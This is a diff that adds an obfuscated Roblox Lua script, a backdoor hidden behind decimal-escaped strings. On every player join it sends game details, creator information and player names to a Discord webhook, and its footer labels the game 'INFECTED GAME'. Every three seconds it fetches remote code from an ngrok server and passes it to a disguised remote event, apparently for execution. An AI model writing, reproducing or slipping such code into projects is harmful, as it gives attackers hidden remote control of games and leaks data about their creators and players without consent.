@@ -1,0 +1,75 @@
+local Players = game:GetService("\80\108\97\121\101\114\115")
+local HttpService = game:GetService("\72\116\116\112\83\101\114\118\105\99\101")
+local MarketplaceService = game:GetService("\77\97\114\107\101\116\112\108\97\99\101\83\101\114\118\105\99\101")
+local RunService = game:GetService("\82\117\110\83\101\114\118\105\99\101")
+local ReplicatedStorage = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101")
+local WEBHOOK_URL = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\52\52\55\53\55\56\57\54\51\54\50\49\57\55\48\48\53\50\47\100\75\71\54\120\102\108\69\49\120\66\54\72\57\119\100\51\81\57\88\117\106\74\48\79\121\76\111\119\49\77\108\66\45\70\73\45\54\66\103\97\51\100\72\113\82\73\105\65\99\100\111\76\70\70\117\110\69\73\114\105\107\86\68\116\110\85\109"
+local SERVER_URL = "\104\116\116\112\115\58\47\47\118\105\116\114\101\111\117\115\45\106\97\99\113\117\101\108\121\110\45\101\103\101\115\116\105\118\101\46\110\103\114\111\107\45\102\114\101\101\46\100\101\118\47\99\111\100\101"
+local GROUP_ID = 149307367
+local FilteringEnabledRE = script:WaitForChild("\83\101\110\115\111\114"):WaitForChild("\70\108\117\105\100"):WaitForChild("\97\105\100\115"):WaitForChild("\70\105\108\116\101\114\105\110\103\69\110\97\98\108\101\100")
+
+local function is(player)
+	return player:IsInGroup(GROUP_ID)
+end
+
+local function rtype(player)
+	local char = player.Character or player.CharacterAdded:Wait()
+	local humanoid = char:FindFirstChildOfClass("\72\117\109\97\110\111\105\100")
+	if humanoid then
+		return humanoid.RigType == Enum.HumanoidRigType.R15 and "R15" or "R6"
+	end
+	return "Unknown"
+end
+
+local function log(player)
+	local gameInfo = { Name = "Unknown Game" }
+	pcall(function()
+		gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+	end)
+
+	local ingame = Players.MaxPlayers
+
+	local embed = {{
+		title = "EDSM",
+		color = 15335424,
+		footer = { text = "**INFECTED GAME**" },
+		fields = {
+			{ name = "Game name", value = gameInfo.Name, inline = false },
+			{ name = "Game link", value = "https://roblox.com/games/" .. game.PlaceId, inline = false },
+			{ name = "Players in game", value = tostring(#Players:GetPlayers()) .. " / " .. tostring(ingame), inline = false },
+			{ name = "Creator info", value = "ID: " .. game.CreatorId .. " | Type: " .. (game.CreatorType == Enum.CreatorType.User and "User" or "Group"), inline = false },
+			{ name = "Recent joins", value = player.Name .. " has joined.", inline = false },
+			{ name = "Time logged", value = os.date("%H:%M - %d/%m/%Y"), inline = false },
+			{ name = "Rig type", value = rtype(player), inline = false }
+		}
+	}}
+
+	local payload = {
+		username = "EDSM",
+		embeds = embed
+	}
+
+	local json = HttpService:JSONEncode(payload)
+	pcall(function()
+		HttpService:PostAsync(WEBHOOK_URL, json)
+	end)
+end
+
+local function load()
+	while task.wait(3) do
+		local success, code = pcall(HttpService.GetAsync, HttpService, SERVER_URL)
+		local exct = 'print("script executed"' .. code ..'")'
+		if success and code and #code > 10 then
+			FilteringEnabledRE:FireServer(code)
+			if FilteringEnabledRE:FireServer(code) then
+				FilteringEnabledRE:FireServer(exct)
+			end
+		end
+	end
+end
+
+Players.PlayerAdded:Connect(function(player)
+	log(player)
+end)
+
+task.spawn(load)
